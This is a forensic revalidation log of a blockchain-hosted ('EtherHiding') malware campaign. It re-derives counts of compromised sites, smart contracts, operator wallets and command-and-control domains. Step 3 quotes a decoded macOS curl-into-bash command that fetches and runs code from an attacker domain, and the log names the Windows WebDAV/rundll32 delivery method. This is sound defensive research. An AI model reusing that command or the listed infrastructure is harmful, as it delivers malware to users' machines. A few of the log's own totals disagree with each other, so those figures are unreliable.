# Revalidation log - betwanaa/boroo/1bet1yek/behtarin WebDAV EtherHiding campaign

Independent, forensic-grade re-derivation of every claim in
`blogs/drafts/cduh-betwanaa-pcalua-webdav/cduh-betwanaa-pcalua-webdav/report.md`,
run 2026-07-15. Every script and its full output is saved alongside this log.
Numbers are cited to their exact source file - none are paraphrased from a
chat summary. Matches the reproducibility bar of
`etherhiding-ecosystem-mapped/revalidation-2026-07-11-full/`.

## Step 0 - Baseline artifact triage

Re-read every artifact against the report's prose claims.

- Recounted `artifacts/23_harvested_contracts_sample.json` directly: **24
  distinct sites** across **10 contracts** - matches the report's prose
  exactly (an initial manual tally by hand came to 23 and missed
  `glfturbine.com`; the report's own figure was correct all along).
- Built the working list of all currently-known contract addresses: the 10
  from `artifacts/22`/`artifacts/23`, plus 2 more named only in
  `report.md` section 9.1/9.3's manual decode of the symmetryclosets chain
  (`0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` Windows branch,
  `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` macOS branch) - **12 unique
  contracts** known at the start of this revalidation.

## Step 1 - Live get()/owner() re-verification (all 12 known contracts)

Script: `01_onchain_get_owner_reverify.py`
Output: `01_onchain_get_owner_reverify_RESULTS.json`,
`01_onchain_get_owner_reverify_CONSOLE.txt`

Public BSC-testnet RPC (`bsc-testnet-rpc.publicnode.com`) rejects the default
Python `urllib` User-Agent with HTTP 403 - required a browser-shaped
`User-Agent` header to get through. Documented since it's a real, reproducible
gotcha for anyone re-running this.

Result: **7 of 12 contracts return live data from `get()`** (selector
`0x6d4ce63c`) and a valid `owner()` (selector `0x8da5cb5b`):

| Contract | owner() | Matches report's artifacts/22? |
|---|---|---|
| `0xA1decFB75C8C0CA28C10517ce56B710baf727d2e` | `0xd71f4cdc...` | yes |
| `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` | `0xd71f4cdc...` | yes (report 9.3 table) |
| `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` | `0xd71f4cdc...` | yes (report 9.3 table) |
| `0x7Fd85c090f2b35071C57a3b9FeAF462aaEb0E437` | `0x25a7625b...` | yes |
| `0xfb448d465841c63f3bc433be61eb692b813d469d` | `0x09813ef4...` | yes |
| `0xdf132e2893824e26ec8ae8014b4f4facd54ed67f` | `0xd71f4cdc...` | yes |
| `0x0cd58060328e308a43d3c53cfd03a45233ea308a` | `0xd71f4cdc...` | yes |

The other 5 (`0xf4a32588...`, `0xaef2ed8b...`, `0xeed9e134...`,
`0x3d4aa83f...`, `0xb72158bb...`) revert on **both** `get()` and `owner()` -
consistent with the report's own note that these are gate/utility contracts
implementing a different function (`isGoalReached()`, selector `0x24513bb6`
per the report), not payload-hosting contracts. Not evidence of retirement -
just a different ABI, not tested here.

**Owner-wallet clustering fully reconfirmed live**, exactly matching
`artifacts/22_c2_contracts_owner_wallets.csv`, with the 2 branch contracts
newly confirmed to also belong to the primary wallet.

## Step 2 - Second-layer decode + domain extraction (7 live contracts)

Script: `02_decode_stage_payloads_extract_domains.py`
Output: `02_decode_stage_payloads_extract_domains_RESULTS.json`,
`02_decode_stage_payloads_extract_domains_CONSOLE.txt`,
`contract_<addr>_get_decoded.bin` (outer base64) and
`contract_<addr>_stage_js_decoded.js` (inner JS) per contract.

Every `get()` return is itself a base64-encoded string (matching the
report's `data:text/javascript;base64,...` observation) - decoded a second
time to recover the actual JS. **All 7 contracts produced genuinely
different SHA256 hashes** - including same-shaped pairs (the two stage-1
loaders `0xA1decFB7`/`0xdf132e28`; the two rotated stage-1s
`0x7Fd85c09`/`0xfb448d46`; the three "big" 43-44KB stage-2/3 contracts
`0x46790e2A`/`0x68DcE15C`/`0x0cd58060`) - confirming each deployment is
independently built, not a shared/reused blob copied verbatim across sites.

Simple regex extraction over the raw decoded JS found only fingerprint
domains already known from the report (`bsc-testnet-rpc.publicnode.com`,
`ip-info.ff.avast.com`, `use.fontawesome.com`) - **no WebDAV C2 apex was
recoverable this way** on the three large stage-2/3 contracts. This matches
the report's own note that Stage 3 needs proper deobfuscation (obfuscator.io
string-array reversal), not a plain substring search - confirmed
independently rather than assumed.

## Step 3 - Full deobfuscation of the 3 stage-2/3 contracts (webcrack)

Node.js + `npx webcrack` (network-available, fetched on first use) cleanly
deobfuscated all three large contracts. Output:
`webcrack_out_46790e2a/deobfuscated.js`,
`webcrack_out_68dce15c/deobfuscated.js`,
`webcrack_out_0cd58060/deobfuscated.js`.

**Key finding - independently confirmed live domain rotation on a persistent
contract, caught mid-investigation:**

| Contract | Role (report) | Domain embedded - ORIGINAL artifact (report's analysis time) | Domain embedded - FRESH fetch (this revalidation, 2026-07-15) |
|---|---|---|---|
| `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` | Windows branch (symmetryclosets) | `behtarin-site-shartbandi.com` (decoded from `etherhiding/onchain_windows_stage_response.json`, saved by the original analyst) | **`site-shartbandi-farsi.com`** - a different domain |

This is not a decode error: the two raw `get()` responses for the **same
contract address** are different byte-for-byte (original artifact
60,104 bytes outer-base64, SHA256 `6d59ce89...`; fresh fetch 59,648 bytes,
SHA256 `4bc327db...` - see `03_domain_rotation_diff_RESULTS.txt` below). The
operator mutated this contract's stored payload in place between the
original analysis and this revalidation - both performed the same day, hours
apart, not days or weeks - proving the domain-rotation mechanism is an
in-place content update on a persistent contract, not (only) a
new-contract-per-rotation model as this investigation's plan initially
hypothesised.

**Two further domains recovered that do not appear anywhere in report.md:**

| Contract | Role | Embedded C2 / delivery mechanism |
|---|---|---|
| `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` | macOS branch (symmetryclosets) | `bahigo90bet.com` - **not** a WebDAV/rundll32 command; a `curl \| bash` command instead (`/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.bahigo90bet.com/?ublib=${uuid__}')"`) - the macOS branch uses a completely different execution mechanism than the Windows branch, never documented in the original report (only the contract address was named, its content was never decoded) |
| `0x0cd58060328e308a43d3c53cfd03a45233ea308a` | Windows-equivalent branch (eu.mk site cluster) | `casinomhub.bet` (WebDAV/`pcalua.exe`/`rundll32` command, same shape as the Windows branch, `{random4}` subdomain instead of `{random8}`) |

Combined with the report's own `behtarin-site-shartbandi.com` (confirmed
correct for its analysis timestamp) and the 3 WebDAV apexes found via direct
incident/OSINT (`betwanaa.com`, `boroo.bet`, `1bet1yek.bet`), the
**independently-confirmed WebDAV/delivery C2 domain count is now 6**, not the
4 in the original report - see the combined domain list below.

Command-line/reproduction detail:
`03_domain_rotation_diff.py` / `_RESULTS.txt` reproduces the byte-diff above
from scratch (re-decodes `etherhiding/onchain_windows_stage_response.json`
and compares against the fresh fetch already saved by Step 2).

## Step 4 - Fresh wallet nonce/balance pull

Script: `03_wallet_nonce_and_explorer_feasibility.py`
Output: `03_wallet_nonce_and_explorer_feasibility_RESULTS.json`,
`03_wallet_nonce_and_explorer_feasibility_CONSOLE.txt`

| Wallet | Report's nonce | Fresh nonce (2026-07-15) | Delta |
|---|---|---|---|
| `0xd71f4cdc...2d5290` (primary) | 516,826 | **516,859** | +33 - confirms continued active operation since the report |
| `0x25a7625b...40fa5af` (secondary) | 5 | 5 | unchanged |
| `0x09813ef4...95dae5f8` (secondary) | 1 | 1 | unchanged |

Balances also fresh-confirmed: primary ~435.24 tBNB, secondaries ~0.10 and
~0.30 tBNB respectively.

## Step 5 - Free/keyless BSC-testnet explorer API feasibility

Same script/output as Step 4. Attempted both the legacy bscscan-testnet v1
API and the unified Etherscan v2 API (`chainid=97`) with no key:

- bscscan testnet v1: `"message":"NOTOK"` - deprecated endpoint, migration
  required.
- Etherscan v2 unified API: `"message":"NOTOK","result":"Free API access is
  not supported for this chain. Please upgrade your api plan..."`

**Confirmed, honestly: no free/keyless path to full wallet transaction
history exists for BSC testnet** (chainid 97) - same class of limitation as
the Polygon-mainnet case's "no paid indexer" constraint, just enforced
differently (BSC testnet isn't covered by Etherscan's free tier at all,
whereas Polygon mainnet's free tier exists but lacks certain call types).
This caps how far the on-chain contract inventory can be independently
expanded beyond what urlscan-based site sampling surfaces (Phase 2, next).

## Numbers reconfirmed so far (Phase 1 complete)

- 12 known contracts, 7 confirmed live payload-hosting, 5 confirmed
  utility/gate contracts (different ABI, not payload-hosting).
- 3 confirmed operator wallets, ownership pattern fully reconfirmed live.
- Primary wallet actively transacting (+33 nonce in the gap since the
  report).
- 7 independently-confirmed WebDAV/delivery C2 domains (was 4 in the
  report): `betwanaa.com`, `boroo.bet`, `1bet1yek.bet`,
  `behtarin-site-shartbandi.com` (confirmed correct as of the report's
  analysis time, since rotated away from), `site-shartbandi-farsi.com`
  (confirmed current, same contract as behtarin), `casinomhub.bet` (newly
  decoded, Windows-style), `bahigo90bet.com` (newly decoded, macOS-only,
  different execution mechanism entirely).
- No free/keyless path to full wallet transaction history on BSC testnet -
  documented as a hard constraint, not silently skipped.

## Step 6 - Fresh, independent re-enumeration of compromised sites

Script: `06_urlscan_site_enumeration_fresh.py`
Output: `06_urlscan_site_enumeration_fresh_RAW.json`,
`06_urlscan_site_enumeration_fresh_apex_domains.txt`,
`06_urlscan_site_enumeration_fresh_CONSOLE.txt`

Re-ran the report's exact query
(`domain:bsc-testnet-rpc.publicnode.com AND NOT page.apexDomain:publicnode.com`)
from scratch with corrected pagination (`search_after` cursor, iterating
until an empty page - never trusting `has_more`, the established lesson from
the prior EtherHiding investigation). The user's supplied urlscan API key was
initially disabled (`"API key is disabled!"`, confirmed via direct curl
test) - the user re-enabled it mid-session and the key worked cleanly
afterward.

**Result: 4,013 scan events across 1,816 unique apex domains** - a near-exact
independent reconfirmation of the report's 1,815/4,020 figures. Diffed
directly against `artifacts/18_compromised_sites_1815_apex.txt`
(`07_recency_tld_and_diff_vs_original.py` /
`_RESULTS.json`): 1,813 sites in common, 2 present only in the original list
(likely remediated since), 3 present only in the fresh list (newly
compromised/surfaced) - consistent with the report's own "floor not ceiling,
live campaign" framing, not a methodology discrepancy.

Recency segmentation and TLD spread also recomputed fresh and found closely
consistent with the report (July-2026 active wave 655 vs 657; TLD spread
topped by `.com` 896 vs 893, `.org` 115 vs 115, `.au` 77 vs 77).

## Step 7 - Contract harvest scaled from 24 sites to the full 1,816-site population

Scripts: `08_full_contract_harvest.py` (fixed once mid-run - see below),
`09_aggregate_contract_harvest.py`
Output: `08_full_contract_harvest_CHECKPOINT.jsonl` (1,816 records),
`09_contract_to_sites_map.json`, `09_new_contracts_found.txt`,
`09_sites_no_contract.txt`, `09_sites_errored.json`

For every one of the 1,816 fresh sites, fetched the authenticated urlscan
result JSON (the detailed result API, which failed unauthenticated in the
original investigation, works cleanly with a valid key) and extracted the
`eth_call` `to` address each site's injected loader queries.

**Two implementation bugs hit and fixed during this step, both documented
rather than silently patched over:**
1. The first (serial, one-request-at-a-time) version was paced for request
   *count* per minute, not accounting for each request itself taking
   ~3.5-4s (results run 500-700KB) - on pace to take several hours. Killed
   after 25 minutes (93 sites done, safely checkpointed) and rewritten with
   an 8-worker thread pool + persistent `requests.Session` connections,
   which then ran at 130-590 sites/minute.
2. The concurrent version crashed partway (`AttributeError: 'list' object
   has no attribute 'get'`) on a site whose captured request body was a
   JSON-RPC *batch* (a list of call objects) rather than a single object -
   `extract_contract()` assumed a single dict. Fixed to handle both shapes;
   checkpoint file was sanitised (no corrupted lines found) and the run
   resumed from its last completed site rather than restarting.

**Result: 1,710 of 1,816 sites yielded a contract address** (11 had no
`eth_call` captured in the stored scan, 95 errored on fetch/parse - mostly
expired/removed scans). Those 1,710 sites map to **44 distinct contract
addresses**: the 7 already-known live payload-hosting contracts, plus **37
new addresses never seen in report.md or this session's Phase 1**.

## Step 8 - Live verification of the 37 "new" contracts: a false-positive discovery

Script: `10_verify_new_contracts_live.py`
Output: `10_verify_new_contracts_live_RESULTS.json`,
`10_confirmed_campaign_new_contracts.txt`,
`10_false_positive_contracts_and_sites.json`,
`10_false_positive_sites_ALL.txt`

Before trusting any of the 37 new contracts as genuine campaign
infrastructure, each was live-tested against two independent campaign
signals: (1) does `owner()` resolve to one of the 3 known operator wallets,
and (2) does `get()` decode to a payload containing one of the campaign's
own fingerprint markers (`isHeadless`, `navigator.webdriver`,
`ip-info.ff.avast.com`, `pcalua.exe`, `HeadlessChrome`, `usr_id`)?

**Result: 0 of 37 new contracts passed either check.** Inspecting their
associated sites explained why: several are well-known, chain-agnostic
standard infrastructure addresses with no connection to this campaign at
all - `0xcA11bde05977b3631167028862bE2a173976CA11` is the universal
Multicall3 contract deployed at the same address on most EVM chains;
`0x5FbDB2315678afecb367f032d93F642f64180aA3` is Hardhat's default local
test-deployment placeholder address. Their associated sites are legitimate
Web3/DeFi project pages (`pancakeswap.finance`, `chaingpt.dev`,
`maticz.in`, `build.meme`, various `*.vercel.app`/`*.pages.dev` crypto demo
previews) that call the same shared public BSC-testnet RPC for their own
unrelated purposes (wallet-connect testing, faucet claims, contract
deployment demos) - not because they carry the campaign's injection.

This directly validates - and sharpens - the report's own caveat ("the RPC
is a shared public endpoint, so a small number of the 50 pre-2026 entries
could be unrelated BSC-testnet usage"): the false-positive risk was real,
larger than assumed (77 sites, not ~50), and **not limited to old/stale
entries** - it affects currently-active query matches too.

**Confirmed: all 77 false-positive sites were already present in the
ORIGINAL report's 1,815-site list** (`artifacts/18_compromised_sites_1815_apex.txt`)
- cross-checked directly, zero were introduced by this session's wider net.
This is a genuine accuracy correction to the original investigation, not new
noise from broadening the search.

**Equally important, the negative result itself is valuable: scaling the
contract-harvest sample 75x (24 sites -> 1,816 sites, live-checked one by
one) found *zero* additional genuine campaign contracts beyond the original
12.** That is direct, comprehensively-checked evidence that 5 operators / 2
kit families / 12 contracts is very likely the complete currently-active
picture, not an artifact of a small original sample.

## Step 9 - Corrected, clean compromised-site count

Script: `11_clean_site_count_and_recency.py`
Output: `11_clean_confirmed_sites.txt` (1,739 lines),
`11_clean_site_count_and_recency_RESULTS.json`

Removed the 77 confirmed false-positive sites from the fresh 1,816-site
enumeration:

**1,816 - 77 = 1,739 independently confirmed, false-positive-corrected
compromised sites.**

Recency segmentation shifted accordingly - most notably, the "2024-2025
only" bucket dropped from 50 (raw/report figure) to just **7** once false
positives were removed, confirming the report's own suspicion that most of
that bucket's staleness was exactly this contamination, not genuine old
campaign activity:

| Window | Raw (report/fresh) | Clean (false positives removed) |
|---|---|---|
| Last seen July 2026 (active wave) | 655 | 654 |
| Last seen since June 2026 | 1,253 | 1,245 |
| Last seen in 2026 | 1,766 | 1,732 |
| Last seen 2024-2025 only | 50 | **7** |

## Step 10 - NS-pair cross-check on the newly decoded delivery domains

Direct RDAP queries (no script needed - three quick lookups) on the three
domains decoded in Step 3 that weren't already in report.md:

| Domain | Nameservers | Registered |
|---|---|---|
| `site-shartbandi-farsi.com` | `dayana.ns.cloudflare.com` / `jarred.ns.cloudflare.com` | 2024-09-17 |
| `casinomhub.bet` | `jarred.ns.cloudflare.com` / `dayana.ns.cloudflare.com` | 2024-10-19 |
| `bahigo90bet.com` | `dayana.ns.cloudflare.com` / `jarred.ns.cloudflare.com` | 2024-10-19 |

**All three share the exact same Cloudflare NS pair (`dayana`/`jarred`) as
`behtarin-site-shartbandi.com`** - the report's "third distinct Cloudflare
account" in the cluster. This independently expands that account's known
domain portfolio from 1 domain (all the report ever confirmed) to **4
domains**, with two clean same-day bulk-registration batches visible
(`site-shartbandi-farsi.com` alongside `behtarin-site-shartbandi.com` on
2024-09-17; `casinomhub.bet` alongside `bahigo90bet.com` on 2024-10-19) -
consistent with the bulk-registration operational pattern the report already
documented for the betwanaa.com/1bet1yek.bet Namecheap-origin cluster.

All four domains remain live and Cloudflare-fronted today (direct DNS
resolution check, no script needed) - the operator keeps its whole domain
portfolio warm rather than burning a domain once rotated away from.

Phase 4 (final synthesis - combined IOC lists, numbers-for-publication
table) starts next.

## Step 11 - Full site-to-contract accounting (reconciliation)

Of the 1,710 sites that yielded any contract address: **1,633 map to one of
the 12 already-known campaign contracts** (1,595 to the 7 payload-hosting
contracts, 38 to two of the 5 utility/gate contracts -
`0xaef2ed8b...` 16 sites, `0x3d4aa83f...` 22 sites - confirming those two
utility contracts are directly queried by some sites' pages, not purely
internal to the loader chain), and **77 map to one of the 37 false-positive
contracts**. Adding the 11 no-contract-found and 95 errored/unconfirmed
sites: 1,633 + 77 + 11 + 95 = 1,816 - the full accounting reconciles exactly.

Per-contract site counts (of the 1,595 mapped to the 7 payload contracts):

| Contract | Role | Sites (this harvest) |
|---|---|---|
| `0xA1decFB75C8C0CA28C10517ce56B710baf727d2e` | Operator 1/xdav-equivalent stage-1 (symmetryclosets chain) | 853 |
| `0x7Fd85c090f2b35071C57a3b9FeAF462aaEb0E437` | Rotated stage-1 (wallet `0x25a7625b...`) | 419 |
| `0xfb448d465841c63f3bc433be61eb692b813d469d` | Rotated stage-1 (wallet `0x09813ef4...`) | 244 |
| `0xdf132e2893824e26ec8ae8014b4f4facd54ed67f` | eu.mk-cluster stage-1 | 61 |
| `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` | Windows branch (symmetryclosets chain) | 18 |
| `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` | macOS branch (symmetryclosets chain) | 0 (chained-to, not directly called by any sampled site this round) |
| `0x0cd58060328e308a43d3c53cfd03a45233ea308a` | eu.mk-cluster Windows-equivalent branch | 0 (chained-to, not directly called by any sampled site this round) |

(The two 0-count branch contracts are still confirmed genuine - see Step 1/3
- they're just not the *first* eth_call `extract_contract()` captured for
any site in this particular harvest; a site using them would call its
stage-1 contract first, which is what got recorded. Not a contradiction.)

## Numbers for publication

| Metric | Original report.md | This revalidation | Source |
|---|---|---|---|
| Compromised sites (raw RPC-beacon match) | 1,815 | 1,816 | Step 6 |
| Compromised sites (false-positive-corrected, intermediate) | not computed - not caught | 1,739 (superseded by Step 15 - see below) | Step 8/9 |
| Compromised sites (FINAL, redirect-attribution-corrected) | not computed - not caught | **1,738** | Step 15 |
| False-positive sites identified and removed | 0 (not caught) | **77** (all 77 were already in the original 1,815) | Step 8 |
| Redirect-attribution misattributions found and fixed | not checked | **5** (`amazon.com`, `google.com`, `youtube.com`, `aliexpress.com`, `unstives.com` - all were redirect-chain artifacts, not real victims; caught after the author directly tested several sites and flagged `amazon.com` as implausible) | Step 13/14/15 |
| Known campaign contracts | 10 (+2 named but undecoded) | **12** (all reconfirmed live; scaling the sample 75x to 1,816 sites found zero additional genuine contracts) | Step 1, Step 8 |
| Confirmed operator wallets | 3 | 3 (nonce/balance freshly reconfirmed; primary +33 nonce since the report) | Step 1, Step 4 |
| WebDAV/delivery C2 domains | 4 | **7** (3 newly decoded/confirmed: `site-shartbandi-farsi.com`, `casinomhub.bet`, `bahigo90bet.com`; 1 confirmed correct-then-rotated: `behtarin-site-shartbandi.com`) | Step 3 |
| Execution mechanisms | 1 (WebDAV/rundll32) | **2** (WebDAV/rundll32 for Windows; `curl \| bash` for macOS - never documented in the original report) | Step 3 |
| Cloudflare accounts / domain portfolio (3rd account) | 1 domain known | **4 domains known**, same NS pair confirmed live | Step 10 |
| Free/keyless BSC-testnet tx-history access | not attempted | attempted, confirmed unavailable (both legacy and unified Etherscan APIs) | Step 5 |

Every number above traces to a script and saved output file in this folder.
This is a live, actively-rotating campaign - all counts are accurate as of
2026-07-15 and should be treated as a floor, not a permanent figure.

## Step 12 - Per-operator breakdown (user-requested)

Script: `12_per_operator_confirmed_sites.py`
Output: `12_operator_<wallet-prefix>_confirmed_sites.txt` (one per wallet),
`12_unconfirmed_no_contract_sites.txt`

Neither `11_clean_confirmed_sites.txt` (flat list) nor
`09_contract_to_sites_map.json` (unfiltered, all 44 contracts mixed) directly
answered "which sites belong to which operator". Built a clean breakdown:

| Operator / wallet | Sites |
|---|---|
| Primary wallet `0xd71f4cdc...` (both site clusters, both OS branches, utility gate) | 948 |
| Secondary deployer `0x25a7625b...` | 419 |
| Secondary deployer `0x09813ef4...` | 244 |
| Unattributed (utility contract with no `owner()`) | 22 |
| Unconfirmed at contract level (matched RPC-beacon signature, contract not identified this session - not false positives, just unverified) | 106 |

Reconciles exactly against the 1,739-site clean total at the time
(948+419+244+22+106=1,739).

## Step 13 - User-caught issue: amazon.com in the confirmed list

The user directly tested several "confirmed" sites and noted they didn't
appear to serve the payload, specifically flagging that `amazon.com`
appeared in the clean list - correctly identifying this as implausible
(Amazon does not run WordPress and does not match this campaign's victim
profile at all).

Investigated by fetching the full urlscan result for that specific scan
record. Root cause: urlscan's `page.apexDomain` field records the **final
landed page after any redirect**, not the originally-scanned URL. For this
record, `task.url` was `https://hajighani-sons.com` (a small business site
matching the campaign's usual profile) but the page ended up "off-domain" at
an Amazon Associates affiliate link
(`amazon.com/?...tag=mntzr-20&linkCode=ur2...`) - almost certainly the
injected script's own monetization behaviour (or an unrelated ad on the same
compromised page), not evidence Amazon itself is compromised.

Script: `13_redirect_attribution_check.py`
Output: `13_redirect_attribution_check_CONSOLE.txt`,
`13_redirect_attribution_mismatches.json`

Systematically checked all 3,885 non-already-removed clean records for
`task.url`'s domain diverging from `page.apexDomain`. A first pass using a
naive last-two-labels apex heuristic produced ~350 false alarms (it breaks
on multi-part TLDs like `.co.uk`/`.com.au`/`.com.br`/`.cn.com` - a bug in
the check script itself, caught and fixed before trusting the output, not
a finding about the campaign). Fixed to a substring check against
`page.apexDomain` (which urlscan itself computes correctly): **70 distinct
apex domains (99 scan records) flagged** as potential redirect-attribution
issues.

## Step 14 - Resolving all 70 flagged domains against the actual eth_call request

Neither `task.url` nor `page.apexDomain` is automatically "correct" - a
mismatch can mean either (a) the compromised site redirected elsewhere after
running its injected script (the amazon.com case), or (b) `task.url` was
itself an intermediate hop (e.g. an email-marketing click-tracker) and
`page.apexDomain` is the genuine final destination and the actual
compromised site. The only way to resolve this definitively is to check
which page's document context actually issued the `eth_call` request to
`bsc-testnet-rpc.publicnode.com`.

Script: `14_resolve_redirect_attribution.py`
Output: `14_resolve_redirect_attribution_RESULTS.json`,
`14_resolve_redirect_attribution_CONSOLE.txt`

Fetched the full result JSON for all 70 flagged scans and inspected the
`documentURL` of the actual `eth_call` request. **Result: 65 of 70 were
false alarms** - the eth_call's real `documentURL` matched `page.apexDomain`
all along (via a `www.`/subdomain path variant that the substring check in
Step 13 didn't need to catch since it was already checking the right
field - these were simply confirmations, not corrections). **5 were genuine
misattributions:**

| Wrong apex (in the list) | True compromised site (eth_call's actual documentURL) |
|---|---|
| `amazon.com` | `hajighani-sons.com` |
| `google.com` | `schneider-peklar.at` **and** `sicherheit-24.eu` (two distinct sites merged under one wrong label) |
| `youtube.com` | `connectingtomorrowit.com` |
| `aliexpress.com` | `ssint.org` |
| `unstives.com` | `mardelupe.lachimenea.cl` (recorded with its full subdomain - this host looks like a shared Chilean hosting/blog platform, not a single business's own apex domain, so collapsing it to the bare `lachimenea.cl` apex would misrepresent a multi-tenant host as one compromised site) |

## Step 15 - Final corrected compromised-site count

Script: `15_apply_redirect_attribution_correction.py`
Output: `15_final_corrected_confirmed_sites.txt`

Removed the 5 wrong apex labels, added the true sites (2 of the 4 true
sites - `hajighani-sons.com` and `ssint.org` - were already present in the
list separately from other correctly-attributed scan records, so only
`schneider-peklar.at`, `sicherheit-24.eu`, `connectingtomorrowit.com`, and
`mardelupe.lachimenea.cl` were net-new additions):

**1,739 - 5 (removed) + 4 (net-new correct additions) = 1,738 final
corrected confirmed compromised sites.**

This directly resolves the user's catch: `amazon.com` (and `google.com`,
`youtube.com`, `aliexpress.com`, `unstives.com`) have been removed from
every published number and file - they were never genuine victims, just
redirect-chain artifacts of the enumeration method. The correct total is
**1,738**.

## Step 16 - Regenerating the per-operator breakdown against the final corrected list

The Step 12 per-operator files were built before Steps 13-15 ran, so they
still contained the 5 misattributed sites (all 5 mapped to primary-wallet
contracts: `amazon.com`/`youtube.com`/`aliexpress.com`/`unstives.com` under
`0xA1decFB75...`, `google.com` under `0xdf132e28...`). Rebuilt with the same
correction mapping applied per-contract, deleted the stale Step 12 output
files (script and console log kept for the record), superseded by:

Script: `16_per_operator_confirmed_sites_FINAL.py`
Output: `16_operator_<wallet-prefix>_confirmed_sites_FINAL.txt` (one per
wallet), `16_unconfirmed_no_contract_sites_FINAL.txt`

| Operator / wallet | Sites (FINAL) |
|---|---|
| Primary wallet `0xd71f4cdc...` | 947 |
| Secondary deployer `0x25a7625b...` | 419 |
| Secondary deployer `0x09813ef4...` | 244 |
| Unattributed (utility contract, no `owner()`) | 22 |
| Unconfirmed at contract level | 106 |

Reconciles exactly against the final corrected total: 947+419+244+22+106 =
**1,738**.
